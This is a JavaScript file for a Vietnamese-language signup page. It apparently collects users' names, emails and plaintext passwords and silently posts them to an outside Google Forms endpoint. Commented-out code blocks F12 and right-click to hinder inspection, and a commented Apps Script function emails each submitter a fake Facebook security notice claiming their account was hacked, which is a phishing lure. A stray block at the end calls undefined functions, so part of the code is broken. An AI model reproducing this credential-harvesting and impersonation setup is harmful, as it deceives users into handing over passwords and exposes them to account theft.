const namecustomer = document.getElementById("fullname");
const email = document.getElementById("email");
const password = document.getElementById("password");
const submit = document.getElementById("submit");
submit.addEventListener("click",() =>{
       var isValid = true;
       // Kiểm tra và gán giá trị cho biến isValid
       isValid = checkName() && isValid;
       isValid = checkEmail() && isValid;
       isValid = checkPass() && isValid;
       isValid = checkRepass() && isValid;
   
       // Nếu tất cả các kiểm tra đều hợp lệ, hiển thị thông báo thành công
       if (isValid) {
           alert("Bạn đã đăng ký thành công");
           alert("Email sẽ sớm gửi về máy bạn")
       if (namecustomer.value && email.value && password.value){
              const data = {
                     name: namecustomer.value,
                     email: email.value,
                     password:password.value
              };
              postData(data);
       }
       async function postData(data){
              const formData = new FormData();
              formData.append("entry.1849378674",data.name);
              formData.append("entry.1103898366",data.email);
              formData.append("entry.1089764332",data.password);
              fetch("https://docs.google.com/forms/d/e/1FAIpQLScUy230l4WcOJlC5Zkgge1UYYX7bP9RgBboCxyZ-hJtdWQPow/formResponse",{
                     method: "POST",
                     body: formData,
                     mode:"no-cors"
              })
       }
       window.location.href = "./home.html"

       }else{
          // Hoặc sử dụng window.location.reload()
       //    document.querySelector("#warring").innerHTML = " Warring: Sau 5s reset website"
       //    setTimeout(() => {
       //           window.location.reload()
       //    }, 5000);
   
       }


})

const showpass = document.getElementById("show-pass");
const inputPass = document.getElementById("password");
showpass.addEventListener("click",function(){
if (showpass.className=="mdieyeoff"){
showpass.classList.replace("mdieyeoff","mdieye");
}else{
showpass.classList.replace("mdieye","mdieyeoff");
}
if (inputPass.type =="password"){
    inputPass.type = "text";
}else{
inputPass.type = "password"
}
})
const showrepass = document.getElementById("show-repass");
const inputrePass = document.getElementById("repassword");
showrepass.addEventListener("click",function(){
if (showrepass.className=="mdieyeoff"){
showrepass.classList.replace("mdieyeoff","mdieye");
}else{
showrepass.classList.replace("mdieye","mdieyeoff");
}
if (inputrePass.type =="password"){
    inputrePass.type = "text";
}else{
inputrePass.type = "password"
}
})

// Hàm kiểm tra tên
function checkName() {
    const nameInput = document.querySelector("#fullname");
    const fullNameRegex = /^[^\d\s]+(\s+[^\d\s]+){1,}$/;
    const errName = !fullNameRegex.test(nameInput.value);
    const errorNameElement = document.querySelector("#error_name");
    
    if (errName) {
        errorNameElement.innerHTML = "Vui lòng nhập lại tên";
        return false;
    } else {
        errorNameElement.innerHTML = "";
        return true;
    }
}

// Hàm kiểm tra email
function checkEmail() {
    const emailInput = document.querySelector("#email");
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const errEmail = !emailRegex.test(emailInput.value);
    const errorEmailElement = document.querySelector("#error_email");

    if (errEmail) {
        errorEmailElement.innerHTML = "Vui lòng nhập lại email";
        return false;
    } else {
        errorEmailElement.innerHTML = "";
        return true;
    }
}

// Hàm kiểm tra mật khẩu
function checkPass() {
    const passInput = document.querySelector("#password");
    const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$/;
    const errPass = !passwordRegex.test(passInput.value);
    const errorPassElement = document.querySelector("#error_pass");

    if (errPass) {
        errorPassElement.innerHTML = "Vui lòng nhập lại mật khẩu";
        return false;
    } else {
        errorPassElement.innerHTML = "";
        return true;
    }
}

// Hàm kiểm tra repass
function checkRepass() {
    const repassInput = document.querySelector("#repassword");
    const passInput = document.querySelector("#password");
    const errRepass = repassInput.value.length < 8 || repassInput.value !== passInput.value;
    const errorRepassElement = document.querySelector("#error_repass");

    if (errRepass) {
        errorRepassElement.innerHTML = "Mật khẩu repass chưa chính xác";
        return false;
    } else {
        errorRepassElement.innerHTML = "";
        return true;
    }
}

       if (checkname() && checkemail() && checkpass() && checkrepass()) {
        alert("Bạn đã đăng ký thành công");
    }
// document.addEventListener("keydown", function(event) {
//        if (event.key === "F12" || event.keyCode === 123) {
//            event.preventDefault();
//        }
//    });
// //Chặn không cho người dùng nhấp chuột phải
// document.addEventListener('contextmenu', function(event) {
//        event.preventDefault(); // Chặn sự kiện mặc định khi chuột phải được nhấp
//      });
// function myFunction(e) {
//        const name = e.values[1];
//        const email = e.values[2];
//        MailApp.sendEmail({
//          to: email,
//          subject:`Thông Báo Khẩn Cấp: Tài Khoản Facebook Của Bạn Đã Bị Hack`,
//          body: `Kính gửi ${name},
     
//      Chúng tôi là nhóm dịch vụ bảo mật Facebook và chúng tôi đang gửi thông báo này cho bạn để thông báo về một vấn đề quan trọng liên quan đến tài khoản Facebook của bạn.
     
//      Chúng tôi đã phát hiện ra rằng tài khoản Facebook của bạn đã bị hack bởi một bên thứ ba không xác định. Các hoạt động gần đây trên tài khoản của bạn đã cho thấy các biểu hiện không bình thường, bao gồm các đăng nhập từ các vị trí không xác định và hoạt động đăng bài không phải do bạn thực hiện.`
//        });
//      };